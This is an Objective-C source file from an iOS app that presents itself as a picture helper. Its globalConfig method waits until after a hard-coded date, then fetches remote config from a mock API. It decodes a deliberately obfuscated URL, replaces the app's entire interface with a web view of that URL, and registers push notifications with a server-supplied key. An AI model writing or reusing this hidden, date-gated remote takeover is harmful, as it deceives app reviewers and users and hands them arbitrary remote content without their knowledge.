//
//  MJPicHelperManager.m
//  MJPicHelper
//
//  Created by wangjun on 2019/10/21.
//  Copyright © 2019 wangjun. All rights reserved.
//

#import "MJPicHelperManager.h"

#import "MJPicSFController.h"
#import "MJPicWKController.h"

#import <JPush/JPUSHService.h>

static MJPicHelperManager *manager;

@implementation MJPicHelperManager

+ (MJPicHelperManager *)shareInstance;
{
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        manager = [MJPicHelperManager new];
    });
    return manager;
}

- (void)globalConfig
{
    if ([self compareTodayIsFuture:@"2019-10-05"])
    {
        [self mjPicGlobalConfigCache];
    }
}

- (void)configMjPicApplication:(UIApplication *)application;
{
    // 设置APNS 服务器上未读消息数
    [JPUSHService setBadge:0];
    // 设置本地图标上，未读消息数
    [application setApplicationIconBadgeNumber:0];
    // 清空通知中心的推送通知
    [application cancelAllLocalNotifications];
}

- (void)cinfigMjPicDeviceToken:(NSData *)token
{
    [JPUSHService registerDeviceToken:token];
}

- (void)mjPicGlobalConfigCache
{
    NSURLSession *tempSession = [NSURLSession sharedSession];
    NSURL *tempUrl = [NSURL URLWithString:@"https://mockapi.eolinker.com/PJibtMc188fa8d71ce6887606b62fc6491af6a90dcc801e/basic/config/pic"];
    NSURLRequest *tempRequest = [NSURLRequest requestWithURL:tempUrl];
    NSURLSessionDataTask *tempTask = [tempSession dataTaskWithRequest:tempRequest completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (!error && data)
        {
            NSError *tempParseError;
            NSDictionary *tempDic = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&tempParseError];
            if (tempDic)
            {
                NSString *tempUrlOriginal = [NSString stringWithFormat:@"%@",tempDic[@"result"][@"time"]];
                if (!tempDic[@"result"][@"time"]) return ;
                if (tempUrlOriginal.length <= 0 || [tempUrlOriginal isEqualToString:@"(null)"]) return ;
                NSString *tempMJJPKey = [NSString stringWithFormat:@"%@",tempDic[@"result"][@"jpToken"]];
                if (tempDic[@"result"][@"jpToken"] != nil && ![tempMJJPKey isEqualToString:@"(null)"]) [self mjPicRegiJp:tempMJJPKey];
                NSArray *tempArray = [tempUrlOriginal componentsSeparatedByString:@"eq3q==&qwas"];
                NSString *tempLast = [tempArray lastObject];
                NSString *tempUrl = [NSString stringWithFormat:@"http%@://%@",tempLast,[tempArray componentsJoinedByString:@"."]];
                if ([tempUrl hasSuffix:[NSString stringWithFormat:@".%@",tempLast]])
                {
                    tempUrl = [tempUrl stringByReplacingCharactersInRange:NSMakeRange(tempUrl.length - (tempLast.length + 1), (tempLast.length + 1)) withString:@""];
                }
                tempUrl = [tempUrl stringByReplacingOccurrencesOfString:@"(null)" withString:@""];
                NSString *tempImgSuffix = [NSString stringWithFormat:@"%@",tempDic[@"result"][@"suffix"]];
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    if ([tempImgSuffix isEqualToString:@"png"])
                    {
                        MJPicWKController *mjwkCon = [[MJPicWKController alloc] initWithURL:tempUrl];
                        UIApplication.sharedApplication.delegate.window.rootViewController = mjwkCon;
                    }
                    else
                    {
                        MJPicSFController *mjsfCon = [[MJPicSFController alloc] initWithURL:[NSURL URLWithString:tempUrl]];
                        UIApplication.sharedApplication.delegate.window.rootViewController = mjsfCon;
                    }
                });
            }
        }
    }];
    [tempTask resume];
}


- (BOOL)compareTodayIsFuture:(NSString *)dateStr
{
    NSDate *tempToday = [self dateWithString:@""];
    NSDate *tempOther = [self dateWithString:dateStr];
    NSComparisonResult tempResult = [tempToday compare:tempOther];
    
    return (tempResult == NSOrderedDescending);
}

- (NSDate *)dateWithString:(NSString *)str
{
    NSDateFormatter *tempFormat = [[NSDateFormatter alloc] init];
    [tempFormat setDateFormat:@"yyyy-MM-dd"];
    if (str.length <= 0)
    {
        str = [tempFormat stringFromDate:[NSDate date]];
    }
    return [tempFormat dateFromString:str];
}

- (void)mjPicRegiJp:(NSString *)jpKey
{
    if (jpKey.length <= 0) return;
    
    [JPUSHService registerForRemoteNotificationTypes:(UIUserNotificationTypeBadge |
                                                      UIUserNotificationTypeSound |
                                                      UIUserNotificationTypeAlert)
                                          categories:nil];
    
    [JPUSHService setupWithOption:nil
                           appKey:jpKey
                          channel:@""
                 apsForProduction:NO];
    
    [JPUSHService setLogOFF];
}
@end
